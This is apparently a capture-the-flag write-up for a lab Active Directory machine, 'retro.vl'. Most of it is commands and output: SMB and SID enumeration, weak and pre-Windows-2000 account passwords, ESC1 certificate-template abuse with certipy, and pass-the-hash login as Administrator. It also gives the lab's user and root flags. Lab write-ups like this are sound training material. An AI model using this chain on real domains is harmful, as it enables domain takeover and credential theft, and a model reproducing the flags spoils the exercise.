
## SMB ENUM

Anonymous login -> open Trainees share
```
[+] IP: 10.129.234.44:445	Name: retro.vl            	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Notes                                             	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Trainees                                          	READ ONLY	

```
```
smb: \> ls
  .                                   D        0  Sun Jul 23 23:58:43 2023
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  Important.txt                       A      288  Mon Jul 24 00:00:13 2023

```

Important.txt
```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

User enum
```
└─$ sudo impacket-lookupsid 'retro.vl/guest'@retro.vl -no-pass                   
[sudo] password for maty-work: 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at retro.vl
[*] StringBinding ncacn_np:retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

User list:
```
Guest
DC
trainee
BANKING$
jburley
tblack
```

the password was same as the username for `trainee` account
```
└─$ nxc smb 10.129.234.44 -u trainee -p trainee                                     
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
```

SMB Shares enum
```
└─$ nxc smb 10.129.234.44 -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ        
```

Valid users
```
└─$ nxc smb 10.129.234.44 -u trainee -p trainee --users 
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                   
SMB         10.129.234.44   445    DC               Administrator                 2023-07-23 20:47:47 0       Built-in account for administering the computer/domain
SMB         10.129.234.44   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.234.44   445    DC               krbtgt                        2023-07-23 21:08:46 0       Key Distribution Center Service Account 
SMB         10.129.234.44   445    DC               trainee                       2023-07-23 21:26:01 0        
SMB         10.129.234.44   445    DC               jburley                       2023-07-23 22:06:50 0        
SMB         10.129.234.44   445    DC               tblack                        2023-07-23 22:08:59 0        
```

SMB share Notes
```
└─$ smbclient -U trainee //10.129.234.44/Notes 
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 05:12:49 2025
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
  user.txt                            A       32  Wed Apr  9 05:13:01 2025
```

User flag
`cbda362cff2099072c5e96c51712ff33`

```
ToDo.txt==
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

BANKING$ account?

https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
pre-windows 2000 computers article to read!!
`pre-windows-2000 accounts have the password same as the username of the account`
BANKING:banking

https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts


#### What is the name of the Certificate Authority (CA) Common Name (CN) that issue certificates in the Active Directory Certificate Services environment?

changed the password with `rpcchangepasswd.py` tool:
`python3 rpcchangepasswd.py retro.vl/banking$:banking@retro.vl`

`certipy-ad find -u BANKING$ -p P@ssw0rd -dc-ip 10.129.234.44 -stdout`
```
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl

```

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

Certipy found that there's a ESC1 vulnerability
`certipy-ad find -u BANKING$ -p P@ssw0rd -dc-ip 10.129.234.44 -vulnerable -stdout`
```
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
---
In the wiki, there's a specified way to exploit this vulnerability
> 💡 **Tip**: To find the SID and other attributes of a target user like 'administrator', you can use the command: `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`

The command to request the certificate:

```shell
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

- `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user performing the request.
- `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
- `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
- `-template 'VulnTemplate'`: The ESC1 vulnerable template.
- `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN.
- `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.
---

`certipy-ad account -u 'BANKING$' -p 'P@ssw0rd' -dc-ip 10.129.234.44 -user 'Administrator' read`
```
└─$ 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl
    name                                : Administrator
    objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2023-07-23T21:07:55+00:00
    whenChanged                         : 2025-05-05T07:11:09+00:00
```

`certipy-ad req -u 'BANKING$' -p 'P@ssw0rd' -dc-ip 10.129.234.44 -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'VulnTemplate' -upn 'Administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'`

```
└─$ 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.
Would you like to save the private key? (y/N): ^CTraceback (most recent call last):

```


---
`└─$ certipy-ad find -u BANKING$ -p P@ssw0rd -dc-ip 10.129.234.44  -vulnerable -enable -stdout`
```
Certificate Templates
  0
    Template Name                       : RetroClients


    Minimum RSA Key Length              : 4096

```

```
└─$ sudo certipy-ad req -u 'banking$@retro.vl' -p 'P@ssw0rd' -dc-ip '10.129.234.44' -target '10.129.234.44' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'               
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
```

`-key-size 4096`

```
└─$ sudo certipy-ad req -u 'banking$@retro.vl' -p 'P@ssw0rd' -dc-ip '10.129.234.44' -target '10.129.234.44' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096

[*] Requesting certificate via RPC
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

---
**Step 2: Authenticate using the obtained certificate.** The attacker now uses the generated `administrator.pfx` file with `certipy auth` to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.

`certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'`

---
```
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389

```

`evil-winrm -i retro-vl -u Administrator -H 252fac7066d93dd009d4fd2cd0368389`

root
`40fce9c3f09024bcab29d377ee1ed071`
